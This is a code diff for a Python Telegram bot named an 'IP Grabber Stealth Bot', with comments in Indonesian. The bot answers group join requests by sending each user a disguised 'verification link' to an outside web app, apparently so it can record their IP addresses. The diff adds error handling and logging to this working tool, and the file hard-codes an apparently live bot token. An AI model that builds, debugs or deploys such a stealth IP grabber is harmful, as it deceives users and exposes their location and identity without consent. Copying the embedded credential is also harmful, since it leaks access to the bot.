@@ -2,6 +2,7 @@ import telebot
 from telebot import types
 import os
 import time
+import traceback
 
 BOT_TOKEN = "8659783782:AAFDtOxRHrZn-0CRdi-qk6ZsspjJXDLjxgg"
 WEB_URL = "https://ip-grabber-bot-production.up.railway.app"
@@ -13,9 +14,15 @@ print("WEB_URL loaded:", WEB_URL)
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-bot.remove_webhook()
-print("Old webhook removed successfully")
-time.sleep(8)   # tunggu lebih lama agar Telegram bersihkan instance lama
+# Bersihkan webhook lama dengan logging detail
+print("Removing old webhook...")
+try:
+    bot.remove_webhook()
+    print("Old webhook removed successfully")
+except Exception as e:
+    print("Failed to remove webhook:", str(e))
+
+time.sleep(10)  # Tunggu lebih lama agar Telegram membersihkan instance lama
 
 @bot.chat_join_request_handler()
 def handle_join_request(request: types.ChatJoinRequest):
@@ -38,11 +45,19 @@ def handle_join_request(request: types.ChatJoinRequest):
         )
         print("Verification link sent to user", user_id)
     except Exception as e:
-        print("Failed to send message to", user_id, ":", e)
+        print("Failed to send message to", user_id, ":", str(e))
 
 @bot.message_handler(commands=['start'])
 def start(message):
     bot.reply_to(message, "IP Grabber Stealth Bot is active.")
 
 print("IP Grabber Stealth Bot is running...")
-bot.infinity_polling()
+
+try:
+    bot.infinity_polling()
+except Exception as e:
+    print("CRITICAL ERROR in infinity_polling:")
+    print("Error type:", type(e).__name__)
+    print("Error message:", str(e))
+    print("Full traceback:")
+    print(traceback.format_exc())
